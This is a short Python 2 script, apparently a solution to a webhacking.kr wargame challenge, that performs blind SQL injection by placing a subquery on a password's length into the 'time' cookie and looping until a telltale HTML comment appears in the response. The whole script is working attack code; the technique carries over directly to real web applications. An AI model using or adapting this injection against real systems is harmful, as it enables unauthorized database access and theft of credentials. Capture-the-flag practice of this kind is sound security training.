import re, urllib, urllib2
response = urllib2.urlopen('http://python.org/')
html = response.read()

my_cookie = "PHPSESSID"

print "Length Of FreeB0aRd Password find Start"

for i in range(1, 100):
    url="http://webhacking.kr/challenge/web/web-02/"
    req=urllib2.Request(url)
    req.add_header('Cookie',"time=1432644376 and (select length(password) from FreeB0aRd)=%d; PHPSESSID=%s" %(i,my_cookie))
    read=urllib2.urlopen(req).read()
    find = re.findall("<!--2070-01-01 09:00:01-->",read)

    if find:
        print "Length Of FreeB0aRd Password: %d" %i
        break
